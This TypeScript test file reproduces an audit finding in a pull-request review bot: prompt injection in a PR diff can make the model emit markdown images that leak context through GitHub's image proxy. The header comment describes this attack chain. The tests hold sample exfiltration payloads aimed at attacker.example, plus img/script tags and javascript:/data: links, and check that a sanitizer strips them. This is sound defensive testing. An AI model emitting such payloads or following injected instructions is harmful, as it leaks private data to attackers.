/**
 * Reproducer tests for security-audit Finding 1:
 * "Indirect prompt injection enables data exfiltration via markdown image
 *  references in bot output."
 *
 * Threat: model-emitted prose ends up unaltered in a GitHub PR comment. If
 * an attacker can steer the model into outputting `![](https://attacker/...)`,
 * GitHub's Camo proxy auto-fetches the URL when any reviewer views the PR,
 * leaking the bot's analysis context.
 *
 * Pre-fix (commit 7834c4c on `feat/inline-suggestions`): there is NO
 * `stripUntrustedMarkdown` and `renderFinalComment` interpolates
 * `summary.narrative` verbatim. The "renderFinalComment leaks an
 * attacker-controlled image URL" test below fails (output contains the URL).
 *
 * Post-fix: `stripUntrustedMarkdown` removes markdown image syntax + dangerous
 * inline HTML + dangerous URL schemes from model-emitted prose fields before
 * those fields reach the comment renderer. The tests pass.
 */
import { describe, test } from 'node:test';
import assert from 'node:assert/strict';

import { stripUntrustedMarkdown } from './sanitize.js';
import { renderFinalComment } from './comment.js';
import { emptyState } from './state.js';
import type { CustomerProductMix, FeatureSummary, PullRequestContext } from './types.js';

describe('stripUntrustedMarkdown', () => {
  test('removes inline markdown image syntax', () => {
    const dirty = 'looks normal ![pixel](https://attacker.example/x?leak=secret) more prose';
    const clean = stripUntrustedMarkdown(dirty);
    assert.ok(!clean.includes('attacker.example'), 'image URL must be stripped');
    assert.ok(!clean.includes('![pixel]'), 'image syntax must be removed');
    assert.ok(clean.includes('looks normal'));
    assert.ok(clean.includes('more prose'));
  });

  test('removes reference-style markdown images', () => {
    const dirty = 'first paragraph\n\n![alt][ref1]\n\n[ref1]: https://attacker.example/r';
    const clean = stripUntrustedMarkdown(dirty);
    assert.ok(!clean.includes('attacker.example'), 'reference URL must be stripped');
  });

  test('removes raw HTML img, script, iframe tags', () => {
    const dirty =
      'prose <img src="https://attacker.example/y" /> more <script>fetch("https://x")</script> tail';
    const clean = stripUntrustedMarkdown(dirty);
    assert.ok(!clean.includes('<img'), '<img> tag must be removed');
    assert.ok(!clean.includes('<script'), '<script> tag must be removed');
    assert.ok(!clean.includes('attacker.example'), 'attacker hosts must be removed');
    assert.ok(clean.includes('prose'));
    assert.ok(clean.includes('tail'));
  });

  test('neutralizes dangerous URL schemes in markdown links', () => {
    const dirty = 'click [here](javascript:alert(1)) or [there](data:text/html;base64,PHNj)';
    const clean = stripUntrustedMarkdown(dirty);
    assert.ok(!clean.includes('javascript:'), 'javascript: scheme must be neutralized');
    assert.ok(!clean.includes('data:'), 'data: scheme must be neutralized');
  });

  test('preserves benign markdown formatting (bold, code, regular links)', () => {
    const dirty = 'A **bold** word and `code` and [GitHub](https://github.com/PostHog/posthog).';
    const clean = stripUntrustedMarkdown(dirty);
    assert.ok(clean.includes('**bold**'));
    assert.ok(clean.includes('`code`'));
    assert.ok(clean.includes('[GitHub](https://github.com/PostHog/posthog)'));
  });

  test('idempotent on already-clean text', () => {
    const clean = 'Plain prose with no attack markers.';
    assert.equal(stripUntrustedMarkdown(clean), clean);
  });

  test('handles empty and null-ish input', () => {
    assert.equal(stripUntrustedMarkdown(''), '');
    assert.equal(stripUntrustedMarkdown(undefined), '');
    assert.equal(stripUntrustedMarkdown(null), '');
    assert.equal(stripUntrustedMarkdown(42), '');
  });
});

describe('renderFinalComment — Finding 1 reproducer (markdown image exfil)', () => {
  /**
   * Demonstrates the exfil channel: an attacker injects a markdown image into
   * `summary.narrative` via prompt injection in the PR diff. Without
   * sanitization, the URL ends up in the rendered comment body and is fetched
   * by every reviewer's browser through Camo.
   */
  test('attacker-controlled image URL in summary.narrative is stripped from rendered comment body', () => {
    const attackerNarrative =
      'A perfectly normal-looking feature description, plus an exfil image: ' +
      '![ok](https://attacker.example/leak?d=event_names_go_here).';
    const summary = makeSummary({ narrative: attackerNarrative });
    const productMix = makeProductMix();
    const pr = makePr();
    const state = emptyState();

    const body = renderFinalComment({
      pr,
      summary,
      productMix,
      outputs: [],
      slackPlan: { enabled: false, suggestedChannel: '', optInMarkdown: '' },
      state,
    });

    assert.ok(
      !body.includes('attacker.example'),
      `attacker host must not appear in rendered comment body. Got:\n---\n${body}\n---`,
    );
    assert.ok(
      !body.includes('![ok]'),
      'markdown image syntax must be stripped from rendered comment body',
    );
    // Sanity: the prose around the image is still present.
    assert.ok(body.includes('A perfectly normal-looking feature description'));
  });

  test('attacker-controlled inline HTML in summary.rationale is stripped from rendered comment body', () => {
    const attackerRationale =
      'My rationale is: <img src="https://attacker.example/pixel" /> and stuff.';
    const summary = makeSummary({ rationale: attackerRationale });

    const body = renderFinalComment({
      pr: makePr(),
      summary,
      productMix: makeProductMix(),
      outputs: [],
      slackPlan: { enabled: false, suggestedChannel: '', optInMarkdown: '' },
      state: emptyState(),
    });

    assert.ok(!body.includes('attacker.example'), 'attacker host must not appear');
    assert.ok(!body.includes('<img'), '<img> tag must be stripped');
  });

  test('attacker-controlled image URL in summary.oneLine is stripped', () => {
    const attackerOneLine = 'Add ![](https://attacker.example/oneline) feature';
    const summary = makeSummary({ oneLine: attackerOneLine });

    const body = renderFinalComment({
      pr: makePr(),
      summary,
      productMix: makeProductMix(),
      outputs: [],
      slackPlan: { enabled: false, suggestedChannel: '', optInMarkdown: '' },
      state: emptyState(),
    });

    assert.ok(!body.includes('attacker.example'));
  });
});

function makeSummary(overrides: Partial<FeatureSummary> = {}): FeatureSummary {
  return {
    oneLine: 'Adds X to Y',
    narrative: 'This PR adds X to Y in the obvious way.',
    size: 'small',
    capabilities: ['do X with Y'],
    surfaces: ['Y'],
    extendsExisting: false,
    extendsFeatures: [],
    relevantProducts: ['product_analytics'],
    rationale: 'Obvious from the diff.',
    ...overrides,
  };
}

function makeProductMix(): CustomerProductMix {
  return {
    enabled: {
      product_analytics: true,
      logs: false,
      error_tracking: false,
      llm_analytics: false,
      feature_flags: false,
      session_replay: false,
      surveys: false,
      experiments: false,
      data_warehouse: false,
      cdp: false,
    },
    slackIntegrationEnabled: false,
  };
}

function makePr(): PullRequestContext {
  return {
    owner: 'PostHog',
    repo: 'pr-autonomy-bot',
    number: 42,
    title: 'Test PR',
    body: '',
    baseSha: 'a'.repeat(40),
    headSha: 'b'.repeat(40),
    author: 'attacker',
    url: 'https://github.com/PostHog/pr-autonomy-bot/pull/42',
    changedFiles: [],
    unifiedDiff: '',
  };
}
